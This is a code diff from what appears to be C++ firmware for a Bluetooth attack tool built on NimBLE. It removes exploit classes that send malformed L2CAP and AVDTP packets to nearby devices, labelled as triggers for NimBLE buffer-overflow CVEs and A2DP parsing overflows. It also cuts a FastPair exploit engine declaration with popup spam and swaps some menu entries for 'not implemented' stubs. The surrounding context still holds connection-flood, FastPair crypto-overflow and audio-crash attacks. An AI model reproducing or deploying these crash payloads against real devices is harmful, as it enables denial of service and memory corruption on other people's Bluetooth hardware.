@@ -116,167 +116,6 @@ String BLEStateManager::getCurrentDeviceName() { return currentDeviceName; }
 size_t BLEStateManager::getActiveClientCount() { return activeClients.size(); }
 
 //=============================================================================
-// NimBLE-Specific Exploit Engine
-//=============================================================================
-
-class NimbleExploitEngine {
-private:
-    bool sendL2CAPPacket(NimBLEAddress target, uint16_t psm, uint8_t* data, size_t len) {
-        NimBLEClient* pClient = NimBLEDevice::createClient();
-        if(!pClient->connect(target)) return false;
-        
-        NimBLEL2CAP* pL2CAP = pClient->getL2CAP();
-        uint16_t cid = pL2CAP->connect(psm);
-        if(cid == 0) {
-            pClient->disconnect();
-            NimBLEDevice::deleteClient(pClient);
-            return false;
-        }
-        
-        bool result = pL2CAP->write(cid, data, len);
-        pL2CAP->disconnect(cid);
-        pClient->disconnect();
-        NimBLEDevice::deleteClient(pClient);
-        return result;
-    }
-
-public:
-    // CVE-2024-47248 - NimBLE Mesh Buffer Overflow
-    bool tryMeshOverflow(NimBLEAddress target) {
-        uint8_t mesh_crash[256] = {0};
-        mesh_crash[0] = 0x00;           // Mesh opcode
-        mesh_crash[1] = 0xFF;           // Invalid length - triggers overflow
-        memset(mesh_crash + 2, 0x41, 254);
-        
-        // Mesh uses PSM 0x0027
-        return sendL2CAPPacket(target, 0x0027, mesh_crash, sizeof(mesh_crash));
-    }
-    
-    // CVE-2024-47249 - NimBLE HCI OOB
-    bool tryHCIOOB(NimBLEAddress target) {
-        uint8_t hci_event[128] = {0};
-        hci_event[0] = 0x04;            // HCI Event
-        hci_event[1] = 0x3E;            // LE Meta Event
-        hci_event[2] = 0xFF;            // Invalid length - OOB trigger
-        memset(hci_event + 3, 0x41, 125);
-        
-        // Send via vendor-specific HCI channel
-        NimBLEClient* pClient = NimBLEDevice::createClient();
-        if(!pClient->connect(target)) return false;
-        
-        // Attempt to send via vendor command characteristic if present
-        NimBLERemoteService* pHCI = pClient->getService("00001801-0000-1000-8000-00805f9b34fb");
-        if(pHCI) {
-            NimBLERemoteCharacteristic* pCmd = pHCI->getCharacteristic("00002a7e-0000-1000-8000-00805f9b34fb");
-            if(pCmd && pCmd->canWrite()) {
-                pCmd->writeValue(hci_event, sizeof(hci_event), false);
-            }
-        }
-        
-        pClient->disconnect();
-        NimBLEDevice::deleteClient(pClient);
-        return true;
-    }
-};
-
-//=============================================================================
-// A2DP Attack Engine (Protocol-level, no full stack needed)
-//=============================================================================
-
-class A2DPAttackEngine {
-private:
-    bool sendAVDTPPacket(NimBLEAddress target, uint8_t* data, size_t len) {
-        NimBLEClient* pClient = NimBLEDevice::createClient();
-        if(!pClient->connect(target)) return false;
-        
-        // AVDTP signaling uses PSM 0x0019
-        NimBLEL2CAP* pL2CAP = pClient->getL2CAP();
-        uint16_t cid = pL2CAP->connect(0x0019);
-        if(cid == 0) {
-            pClient->disconnect();
-            NimBLEDevice::deleteClient(pClient);
-            return false;
-        }
-        
-        bool result = pL2CAP->write(cid, data, len);
-        pL2CAP->disconnect(cid);
-        pClient->disconnect();
-        NimBLEDevice::deleteClient(pClient);
-        return result;
-    }
-
-public:
-    // Test A2DP discovery parsing
-    bool testDiscoveryOverflow(NimBLEAddress target) {
-        uint8_t avdtp_crash[] = {
-            0x01,                       // AVDTP_DISCOVER
-            0x00,                       // Transaction ID
-            0x00, 0xFF,                  // Invalid packet length
-            0x41, 0x41, 0x41, 0x41,      // Overflow data
-            0x41, 0x41, 0x41, 0x41
-        };
-        return sendAVDTPPacket(target, avdtp_crash, sizeof(avdtp_crash));
-    }
-    
-    // Test codec negotiation overflow
-    bool testCodecOverflow(NimBLEAddress target) {
-        uint8_t sbc_crash[] = {
-            0x02,                       // AVDTP_GET_CAPABILITIES
-            0x01,                       // Transaction ID
-            0x00, 0x20,                  // Length
-            0x07,                       // Media Transport
-            0xFF, 0xFF,                   // Invalid SBC params - bitpool too large
-            0x41, 0x41, 0x41, 0x41
-        };
-        return sendAVDTPPacket(target, sbc_crash, sizeof(sbc_crash));
-    }
-    
-    // Test stream setup overflow
-    bool testStreamOverflow(NimBLEAddress target) {
-        uint8_t stream_crash[128];
-        memset(stream_crash, 0x41, 128);
-        stream_crash[0] = 0x03;          // AVDTP_OPEN
-        stream_crash[1] = 0xFF;          // Invalid SEID
-        return sendAVDTPPacket(target, stream_crash, sizeof(stream_crash));
-    }
-};
-
-//=============================================================================
-// FastPair Exploit Engine Declaration
-//=============================================================================
-
-class FastPairExploitEngine {
-public:
-    std::vector<FastPairDeviceInfo> scanForFastPairDevices(int duration);
-    bool exploitFastPairConnection(NimBLEAddress target, FastPairExploitType exploitType);
-    void spamFastPairPopups(FastPairPopupType popupType, int count);
-    bool testVulnerability(NimBLEAddress target);
-
-private:
-    std::vector<FastPairDeviceInfo> discoveredDevices;
-    NimBLERemoteCharacteristic* findKBPCharacteristic(NimBLERemoteService* service);
-    bool executeMemoryCorruption(NimBLERemoteCharacteristic* pChar);
-    bool executeStateConfusion(NimBLERemoteCharacteristic* pChar);
-    bool executeCryptoOverflow(NimBLERemoteCharacteristic* pChar);
-    bool executeHandshakeFault(NimBLERemoteCharacteristic* pChar);
-    bool executeRapidConnection(NimBLEAddress target, NimBLERemoteCharacteristic* pChar);
-    bool executeAllExploits(NimBLERemoteCharacteristic* pChar, NimBLEAddress target);
-    uint32_t selectModelForPopup(FastPairPopupType type);
-    uint32_t randomRegularModel();
-    uint32_t randomFunModel();
-    uint32_t randomPrankModel();
-    uint32_t selectCustomModel();
-    void createFastPairAdvertisement(uint8_t* buffer, uint32_t modelId);
-    String getDeviceTypeFromModelId(uint32_t modelId);
-    bool testServiceDiscovery(NimBLEAddress target);
-    bool testCharacteristicAccess(NimBLEAddress target);
-    bool testBufferOverflow(NimBLEAddress target);
-    bool testStateConfusion(NimBLEAddress target);
-    void logExploitResult(NimBLEAddress target, FastPairExploitType type, bool success);
-    void generateRandomMac(uint8_t* mac);
-};
-
-//=============================================================================
 // BLE Attack Manager
 //=============================================================================
 
@@ -1021,25 +860,7 @@ bool HIDExploitEngine::testHIDVulnerability(NimBLEAddress target) {
 // WhisperPair Exploit (FastPair Crypto Attacks)
 //=============================================================================
 
-class WhisperPairExploit {
-public:
-    WhisperPairExploit() : bleManager() {}
-    
-    bool execute(NimBLEAddress target);
-    bool executeSilent(NimBLEAddress target);
-    bool executeAdvanced(NimBLEAddress target, int attackType);
-    NimBLERemoteCharacteristic* findKBPCharacteristic(NimBLERemoteService* fastpairService);
-    bool sendCryptoOverflowAttack(NimBLERemoteCharacteristic* kbpChar);
-    bool sendStateConfusionAttack(NimBLERemoteCharacteristic* kbpChar);
-
-private:
-    BLEAttackManager bleManager;
-    FastPairCrypto crypto;
-    
-    bool performRealHandshake(NimBLERemoteCharacteristic* kbpChar, uint8_t* devicePubKey);
-    bool sendProtocolAttack(NimBLERemoteCharacteristic* kbpChar, const uint8_t* devicePubKey);
-    bool testForVulnerability(NimBLERemoteCharacteristic* kbpChar);
-};
+WhisperPairExploit::WhisperPairExploit() : bleManager() {}
 
 NimBLERemoteCharacteristic* WhisperPairExploit::findKBPCharacteristic(NimBLERemoteService* fastpairService) {
     if(!fastpairService) return nullptr;
@@ -2237,7 +2058,7 @@ bool MultiConnectionAttack::connectionFlood(std::vector<NimBLEAddress> targets, 
         }
     }
 
-    cleanup();
+    this->cleanup();
     cleanup.disable();
     if(anySuccess) showAttackResult(true, "Connection flood completed");
     else showAttackResult(false, "Flood attack failed");
@@ -4111,7 +3932,6 @@ void showAudioSubMenu(NimBLEAddress target) {
     if(choice == -1) return;
     
     AudioAttackService audio;
-    A2DPAttackEngine a2dp;
     
     String connectionMethod = "";
     NimBLEClient* pClient = attemptConnectionWithStrategies(target, connectionMethod);
@@ -4129,24 +3949,18 @@ void showAudioSubMenu(NimBLEAddress target) {
             break;
         }
         case 1:
-            if(a2dp.testDiscoveryOverflow(target))
-                showAttackResult(true, "A2DP discovery test completed");
-            else
-                showAttackResult(false, "A2DP discovery test failed");
+            showAttackProgress("A2DP discovery attack not implemented", TFT_YELLOW);
+            delay(1000);
             break;
         case 2:
-            if(a2dp.testCodecOverflow(target))
-                showAttackResult(true, "A2DP codec test completed");
-            else
-                showAttackResult(false, "A2DP codec test failed");
+            showAttackProgress("A2DP codec attack not implemented", TFT_YELLOW);
+            delay(1000);
             break;
         case 3:
             audio.crashAudioStack(target);
             break;
         case 4:
             audio.findAndAttackAudioServices(pClient);
-            a2dp.testDiscoveryOverflow(target);
-            a2dp.testCodecOverflow(target);
             break;
     }
     
@@ -4212,53 +4026,34 @@ void showMemorySubMenu(NimBLEAddress target) {
     const char* options[] = {
         "FastPair Crypto Overflow",
         "FastPair State Confusion",
-        "NimBLE Mesh Overflow (CVE-2024-47248)",
-        "NimBLE HCI OOB (CVE-2024-47249)",
-        "Try All Memory Attacks"
+        "Test All Memory Attacks"
     };
     
-    int choice = showSubMenu("Memory Corruption", options, 5);
+    int choice = showSubMenu("Memory Corruption", options, 3);
     if(choice == -1) return;
     
     WhisperPairExploit whisper;
-    NimbleExploitEngine nimbleExp;
     
     NimBLEClient* pClient = nullptr;
     NimBLERemoteCharacteristic* pKbpChar = nullptr;
     
-    if(choice == 0 || choice == 1 || choice == 4) {
-        String connectionMethod = "";
-        pClient = attemptConnectionWithStrategies(target, connectionMethod);
-        if(pClient) {
-            BLEStateManager::registerClient(pClient);
-            NimBLERemoteService* pService = pClient->getService(NimBLEUUID((uint16_t)0xFE2C));
-            if(pService) pKbpChar = whisper.findKBPCharacteristic(pService);
-        }
+    String connectionMethod = "";
+    pClient = attemptConnectionWithStrategies(target, connectionMethod);
+    if(pClient) {
+        BLEStateManager::registerClient(pClient);
+        NimBLERemoteService* pService = pClient->getService(NimBLEUUID((uint16_t)0xFE2C));
+        if(pService) pKbpChar = whisper.findKBPCharacteristic(pService);
     }
     
     switch(choice) {
         case 0: if(pKbpChar) whisper.sendCryptoOverflowAttack(pKbpChar); break;
         case 1: if(pKbpChar) whisper.sendStateConfusionAttack(pKbpChar); break;
         case 2:
-            if(nimbleExp.tryMeshOverflow(target))
-                showAttackResult(true, "Mesh overflow test completed");
-            else
-                showAttackResult(false, "Mesh overflow test failed");
-            break;
-        case 3:
-            if(nimbleExp.tryHCIOOB(target))
-                showAttackResult(true, "HCI OOB test completed");
-            else
-                showAttackResult(false, "HCI OOB test failed");
-            break;
-        case 4:
             if(pKbpChar) {
                 whisper.sendCryptoOverflowAttack(pKbpChar);
                 delay(200);
                 whisper.sendStateConfusionAttack(pKbpChar);
             }
-            nimbleExp.tryMeshOverflow(target);
-            nimbleExp.tryHCIOOB(target);
             break;
     }
     
